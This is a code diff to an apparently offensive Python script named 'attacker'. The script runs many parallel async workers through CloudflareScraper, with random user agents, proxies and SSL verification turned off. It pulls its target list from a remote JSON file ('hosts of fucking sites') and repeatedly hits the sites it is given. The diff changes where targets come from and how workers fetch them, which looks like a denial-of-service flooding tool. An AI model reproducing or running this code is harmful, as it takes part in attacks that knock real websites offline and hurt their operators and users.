@@ -1,5 +1,7 @@
 import asyncio
+import json
 import random
+import typing
 from sys import stderr
 
 import requests
@@ -9,7 +11,7 @@ from loguru import logger
 from pyuseragents import random as random_useragent
 from urllib3 import disable_warnings
 
-HOSTS = 'http://rockstarbloggers.ru/hosts.json'  # api with hosts of fucking sites
+HOSTS = 'https://raw.githubusercontent.com/abionics/attacker/master/hosts.json'  # hosts of fucking sites
 TIMEOUT = ClientTimeout(
     total=10,
     connect=10,
@@ -34,21 +36,33 @@ HEADERS_TEMPLATE = {
 
 
 def main():
+    hosts = _get_hosts()
     loop = asyncio.get_event_loop()
     union = asyncio.gather(*[
-        start_one()
+        start_one(hosts)
         for _ in range(PARALLEL_COUNT)
     ])
     loop.run_until_complete(union)
 
 
-async def start_one():
+def _get_hosts() -> typing.Union[list, dict]:
     while True:
         try:
-            data = _get_target_data()
-            url = data['site']['url']
-            url = _fix_url(url, force_https=FORCE_HTTPS)
+            return requests.get(HOSTS, timeout=3).json()
+        except:
+            continue
+
+
+async def start_one(hosts: list):
+    while True:
+        try:
             async with CloudflareScraper(timeout=TIMEOUT, trust_env=True) as session:
+                host = random.choice(hosts)
+                async with session.get(host, verify_ssl=False) as response:
+                    content = await response.text()
+                    data = json.loads(content)
+                url = data['site']['url']
+                url = _fix_url(url, force_https=FORCE_HTTPS)
                 success = await attempt(session, url)
                 if not success:
                     if CUSTOM_PROXY:
@@ -68,16 +82,6 @@ async def start_one():
                             break
         except Exception as e:
             logger.warning(f'Exception, retrying, exception={e}')
-
-
-def _get_target_data():
-    while True:
-        try:
-            hosts = requests.get(HOSTS, timeout=5).json()
-            host = random.choice(hosts)
-            return requests.get(host, timeout=3).json()
-        except:
-            continue
 
 
 def _load_proxies(filename: str) -> list:
